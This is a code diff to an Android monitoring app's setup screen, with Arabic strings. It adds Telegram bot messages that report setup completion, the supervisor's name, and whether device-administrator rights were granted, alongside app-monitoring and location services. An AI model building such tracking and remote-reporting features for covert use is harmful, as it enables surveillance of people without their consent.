@@ -67,6 +67,11 @@ public class SetupActivity extends AppCompatActivity {
             startService(new Intent(this, AppMonitorService.class));
             startService(new Intent(this, LocationService.class));
             
+            // إرسال رسالة إعداد ناجح
+            TelegramBot.sendMessage("✅ <b>تم الإعداد بنجاح!</b>\n\n" +
+                                   "👤 اسم المشرف: " + supervisorName + "\n" +
+                                   "📱 الجهاز جاهز للمراقبة");
+            
             Toast.makeText(this, "تم الإعداد بنجاح!", Toast.LENGTH_SHORT).show();
             startActivity(new Intent(this, MainActivity.class));
             finish();
@@ -79,8 +84,10 @@ public class SetupActivity extends AppCompatActivity {
         if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
             if (resultCode == RESULT_OK) {
                 Toast.makeText(this, "تم تفعيل صلاحيات المشرف", Toast.LENGTH_SHORT).show();
+                TelegramBot.sendMessage("🔐 <b>تم تفعيل صلاحيات المشرف</b>");
             } else {
                 Toast.makeText(this, "رفضت التفعيل", Toast.LENGTH_SHORT).show();
+                TelegramBot.sendMessage("❌ <b>تم رفض صلاحيات المشرف!</b>");
             }
         }
     }
